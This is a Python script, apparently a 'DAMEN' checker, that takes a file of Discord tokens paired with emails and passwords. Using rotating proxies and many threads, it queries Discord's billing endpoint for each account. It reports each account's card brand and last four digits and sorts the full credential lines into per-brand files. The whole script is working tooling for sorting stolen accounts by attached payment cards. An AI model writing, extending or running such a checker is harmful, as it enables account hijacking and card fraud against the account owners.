print("\033[38;5;88m" + r"""
                    ▓█████▄  ▄▄▄       ███▄ ▄███▓▓█████  ███▄    █
                    ▒██▀ ██▌▒████▄    ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █
                    ░██   █▌▒██  ▀█▄  ▓██    ▓██░▒███   ▓██  ▀█ ██▒
                    ░▓█▄   ▌░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒
                    ░▒████▓  ▓█   ▓██▒▒██▒   ░██▒░▒████▒▒██░   ▓██░
                     ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ 
                     ░ ▒  ▒   ▒   ▒▒ ░░  ░      ░ ░ ░  ░░ ░░   ░ ▒░
                     ░ ░  ░   ░   ▒   ░      ░      ░      ░   ░ ░ 
                       ░          ░  ░       ░      ░  ░         ░ 
                     ░                                             
""")

import requests
import random
import json
import os
import time
from threading import Thread, Lock
from queue import Queue

# Load tokens and proxies
tokens = [line.strip() for line in open("tokens.txt") if line.strip()]
proxies = [line.strip() for line in open("proxies.txt") if line.strip()]

os.makedirs("output", exist_ok=True)

# Ask how many threads to run
try:
    threads_count = int(input("\033[1;96mHow many threads do you want to run? ➔ \033[0m"))
except ValueError:
    print("\033[1;91mInvalid input. Using default 5 threads.\033[0m")
    threads_count = 5

lock = Lock()
queue = Queue()

def now():
    return time.strftime("%H:%M:%S", time.localtime())

def get_proxy():
    if not proxies:
        return None
    raw = random.choice(proxies)
    if "@" in raw:
        return {
            "http": f"http://{raw}",
            "https": f"http://{raw}"
        }
    else:
        return {
            "http": f"http://{raw}",
            "https": f"http://{raw}"
        }

def extract_token(line: str):
    # Extract token from line like email:pass:token or token|extra
    if "@" in line and ":" in line:
        parts = line.split(":")
        token_part = parts[-1]
    elif "|" in line:
        token_part = line.split("|")[0]
    else:
        token_part = line
    return token_part.strip()

def check_payment_method(full_line: str):
    token = extract_token(full_line)
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(
            "https://discord.com/api/v9/users/@me/billing/payment-sources",
            headers=headers,
            proxies=get_proxy(),
            timeout=10
        )
    except Exception as e:
        with lock:
            print(f"\033[1;90m{now()} » \033[1;91mERROR \033[1;97m• Request failed ➔ \033[1;91m[{token[:30]}...] ➔ {e}\033[0m")
        return

    status = response.status_code

    if status == 200:
        try:
            data = response.json()
            if not data:
                with lock:
                    print(f"\033[1;90m{now()} » \033[1;93mNOTICE \033[1;97m• No payment method ➔ \033[1;93m[{token[:30]}...]\033[0m")
                return

            has_card = False
            for source in data:
                if source.get("type") == 1:
                    has_card = True
                    brand = source.get("brand", "Unknown").upper()
                    last_4 = source.get("last_4", "XXXX")
                    valid = not source.get("invalid", True)

                    color = "\033[1;92m" if brand == "VISA" else "\033[1;95m" if brand == "MASTERCARD" else "\033[1;96m"

                    with lock:
                        if valid:
                            print(f"\033[1;90m{now()} » {color}{brand} \033[1;97m• Payment ➔ {color}[{brand} - ****{last_4}]\033[1;97m ➔ {color}[{token[:30]}...]\033[0m")
                        else:
                            print(f"\033[1;90m{now()} » {color}{brand} \033[1;91m• INVALID \033[1;97m➔ {color}[{brand} - ****{last_4}]\033[1;97m ➔ {color}[{token[:30]}...]\033[0m")

                        with open(f"output/{brand.lower()}.txt", "a") as f:
                            f.write(full_line + "\n")  # Save full original line

            if not has_card:
                with lock:
                    print(f"\033[1;90m{now()} » \033[1;93mNOTICE \033[1;97m• No card type 1 found ➔ \033[1;93m[{token[:30]}...]\033[0m")

        except Exception as e:
            with lock:
                print(f"\033[1;90m{now()} » \033[1;91mERROR \033[1;97m• JSON error ➔ \033[1;91m[{token[:30]}...] ➔ {e}\033[0m")
    elif status == 401:
        with lock:
            print(f"\033[1;90m{now()} » \033[1;91mINVALID \033[1;97m• Unauthorized ➔ \033[1;91m[{token[:30]}...] ➔ Invalid token\033[0m")
    elif status == 403:
        with lock:
            print(f"\033[1;90m{now()} » \033[1;91mFORBIDDEN \033[1;97m• Access denied ➔ \033[1;91m[{token[:30]}...]\033[0m")
    else:
        with lock:
            print(f"\033[1;90m{now()} » \033[1;91mERROR \033[1;97m• HTTP {status} ➔ \033[1;91m[{token[:30]}...]\033[0m")


def worker():
    while not queue.empty():
        token = queue.get()
        try:
            check_payment_method(token)
        finally:
            queue.task_done()

# Enqueue tokens
for token in tokens:
    queue.put(token)

# Start threads
threads = []
for _ in range(threads_count):
    t = Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all to finish
for t in threads:
    t.join()

print("\n\033[1;92mDone checking all tokens.\033[0m")
